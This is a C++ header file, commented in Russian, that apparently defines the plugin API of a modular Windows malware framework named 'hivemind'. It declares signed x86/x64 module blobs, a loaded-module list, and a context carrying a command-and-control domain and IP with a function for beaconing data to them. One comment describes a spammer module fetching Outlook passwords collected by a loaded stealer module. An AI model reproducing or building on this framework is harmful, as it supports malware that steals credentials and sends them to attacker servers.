#pragma once

#include <Windows.h>

#ifdef sign_ed25519_BYTES_DETACHED
#define MODULE_SIGNATURE_SIZE_DETACHED sign_ed25519_BYTES_DETACHED
#else
#define MODULE_SIGNATURE_SIZE_DETACHED 64U
#endif

// прототип gd функции, опциональная функция на экспорте если модулю требуется клиент-серверное взаимодействие с ним клиентов-модулей
// парадигма следующая: если модулю А требуется взаимодействовать с модулем Б, то в таком случае модуль А может вызвать gd и передать
// параметр модулю А, зависящий от конкретной имплементации модуля А, модуль А его как-то обработает и вернет результат
// use case: модулю спамилки требуются пароли от аутлука, для этого он ищет через доступ к lock_mlist модуль стилера загруженный, находит в mlist 
// указатель на gd модуля стилера и запрашивает по клиент-серверной модели взаимодействия сохраненную копию собранных паролей
// в случае если стилер все еще активен, то стилер вернет статус неготовности, иначе - запрашиваемые данные
// таким образом возможно реализовать микросервисную архитектуру на модулях и взаимодействие между ними по заданному API
typedef DWORD(WINAPI *fnGetData)(LPBYTE lpBuffer, DWORD dwParameterSize, LPBYTE *lpOutputBuffer, PDWORD pdwOutputSize);
typedef void* HLOADEDMODULE;

namespace module_data
{
	// структура нерезидентного модуля
#pragma pack(1)
	struct nonresident_mdata
	{
		// архитектура модуля - x86 / x64 - IMAGE_FILE_MACHINE_AMD64 / IMAGE_FILE_MACHINE_I386
		DWORD32 dwArchitecture;
		// дворд-имя модуля
		DWORD32 dwModuleName;
		// размер буффера
		DWORD32 dwBufferSize;
		// зарезервированные поля для последующего расширения структуры без потери обратной совместимости
		DWORD dwReserved;
		DWORD dwReserved2;
		DWORD dwReserved3;
		DWORD dwReserved4;
		DWORD dwReserved5;
		DWORD dwReserved6;
		// буффер модуля для загрузки
		unsigned char bufModuleFile[];
	};
#pragma pack()

	// структура резидентного модуля
#pragma pack(1)
	struct resident_mdata
	{
		// размер resident_mdata + размер блобов модулей = полный размер структуры резидентных модулей. Данный полный буффер пишется в vfs и также парится и загружается в зависимости от разрядности хост апп
		DWORD32 dwStructSize;
		// размер x86 модуля
		DWORD32 dwModulex86Size;
		// размер x64 модуля
		DWORD32 dwModulex64Size;
		// оффсет от начала структуры до x86 буффера
		DWORD32 dwModulex86BufferOffset;
		// оффсет от начала структуры до x64 буффера
		DWORD32 dwModulex64BufferOffset;
		// дворд-имя модуля
		DWORD32 dwModuleName;
		// detached цифровая подпись x86 буфера
		unsigned char bufSignaturex86[MODULE_SIGNATURE_SIZE_DETACHED];
		// detached цифровая подпись x64 буфера
		unsigned char bufSignaturex64[MODULE_SIGNATURE_SIZE_DETACHED];
		// зарезервированные поля для последующего расширения структуры без потери обратной совместимости
		DWORD dwReserved;
		DWORD dwReserved2;
		DWORD dwReserved3;
		DWORD dwReserved4;
		DWORD dwReserved5;
		DWORD dwReserved6;
	};
#pragma pack()


	typedef enum _msystem_status
	{
		MODULESYSTEM_NETWORK_ACTIVE, // сервер найден можно стучать, все поля в контексте валидны
		MODULESYSTEM_NETWORK_PENDING, // сеть на данный момент находится в поиске сервера. Поля IP, Domain и Session гарантированно невалидны
		MODULESYSTEM_SUSPEND, // ничего не делать в модулях, валидность полей не гарантирует
		MODULESYSTEM_HALT, // произвести выгрузку всех модулей и считать контекст более недействительным. Объект модульной системы разрушен. Использование полей приведет к крашу
	} msystem_status_t;

	typedef enum _send_status
	{
		SEND_SUCCESS,
		SEND_ERROR
	} send_status_t;

	/*
	функция для отстука в сеть 
	pwchDomain - домен куда отстучать
	pwchIP - айпи куда отстучать
	lpData - данные для отправки
	dwDataSize - размер данных для отправки
	lpOutputBuffer - принимает указатель на буфер с ответом - освободить при помощи VirtualFree
	dwOutputSize - размер буфера
	PWCHAR pwchSessionJson - сессия, нужна для инкапсуляции данных от модуля
	DWORD dwFileName - имя модуля
	ret -> статус module_data::send_status_t
	*/
	typedef module_data::send_status_t(WINAPI *fnSendData)(PWCHAR pwchDomain, PWCHAR pwchIP, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpOutputBuffer, PSIZE_T dwOutputSize, PWCHAR pwchSessionJson, DWORD dwFileName);
	
	// список загруженных модулей
	struct hivemind_modulelist
	{
		DWORD dwFileName;
		HLOADEDMODULE hModule;
		fnGetData gd;
		hivemind_modulelist *next;
	};

#pragma pack(1)
	// контекст модульной системы - передается модулю при запуске
	// доступ к переменным с префиксом lock_ осущеставляется исключительно входом в критическую секцию
	struct msys_context
	{
		// секция для синхронизации
		CRITICAL_SECTION critSect;
		// домен куда стучать, требуется передать в send
		WCHAR lock_wchDomain[256];
		// айпи куда стучать, требуется передать в send
		WCHAR lock_wchIP[256];
		// указатель на json текущей сессии
		PWCHAR lock_pwchSessionJson;
		// все с префиксами lock_ передавать в send в отдельных нововыделенных буферах (не напряую из msys_context), так как они могут измениться внешним кодом
		// текущий статус модульной системы
		msystem_status_t lock_status;
		// отстук, вызывать исключительно если статус == MODULESYSTEM_NETWORK_ACTIVE, иначе ожидать данного статуса
		fnSendData send;

		hivemind_modulelist **lock_mlist; // указатель на указатель списка загруженных модулей, итерировать только в критической секции и долго не задерживаться внутри
	};
#pragma pack()

}

// прототип sm функции, вызывается при загрузке модуля
typedef DWORD(WINAPI *fnStartModule)(module_data::msys_context *ctx);

